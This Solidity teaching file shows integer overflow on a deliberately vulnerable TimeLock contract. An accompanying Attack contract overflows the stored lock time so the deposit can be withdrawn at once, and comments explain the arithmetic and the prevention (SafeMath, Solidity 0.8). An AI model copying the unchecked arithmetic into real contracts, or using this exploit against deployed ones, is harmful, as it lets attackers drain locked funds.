// solidity < 0.8 
// integers overflow / underflow without any errors

// solidity >= 0.8
// default behavior for overflow / underflow is to throw an error

// preventative techniques
// - use SafeMath to will prevent arithmetic overflow and underflow
// - solidity 0.8 defaults to throwing an error for overflow / underflow

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.6;

// this conract is designed to act as a time vault
// user can deposit into this contract but cannot withdraw for at least a week
// user can also extend the wait time beyond the 1 week waiting period

/* 
1. Deploy timelock
2. Deploy attack with address of timelock
3. Call attack.attack sending 1 ether. You will immediately be able to withdraw your ether.

What happened?
Attack caused the timelock.locktime to overflow and was able to withdraw
before the 1 week waiting period
 */

contract TimeLock {
    mapping (address => uint) public balances;
    mapping (address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t 
         */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}

